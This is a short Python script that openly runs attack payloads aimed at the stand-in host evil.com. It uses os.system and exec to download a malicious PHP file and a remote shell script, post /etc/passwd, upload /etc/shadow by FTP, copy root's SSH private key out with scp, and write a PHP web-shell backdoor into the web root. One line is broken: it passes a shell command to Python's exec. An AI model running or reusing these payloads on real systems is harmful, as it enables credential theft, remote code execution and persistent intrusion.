import requests
import os

payload1 = "wget http://evil.com/malicious.php -O /tmp/malicious.php"
payload2 = """curl -X POST -F "file=@/etc/passwd" http://evil.com/upload"""
payload3 = """python3 -c "import urllib.request; urllib.request.urlretrieve('http://evil.com/shell.py', '/tmp/shell.py')"""
payload4 = """echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php"""
payload5 = """scp /root/.ssh/id_rsa eviluser@evil.com:/home/eviluser/stolen_key"""
payload6 = """import ftplib; ftp = ftplib.FTP('evil.com'); ftp.login('anonymous', ''); ftp.storbinary('STOR /uploads/pwned.txt', open('/etc/shadow', 'rb')); ftp.quit()"""
os.system(payload1)
requests.post("http://evil.com/upload", files={"file": open("/etc/passwd", "rb")})
exec(payload3)
os.system(payload4)
os.system(payload5)
exec(payload6)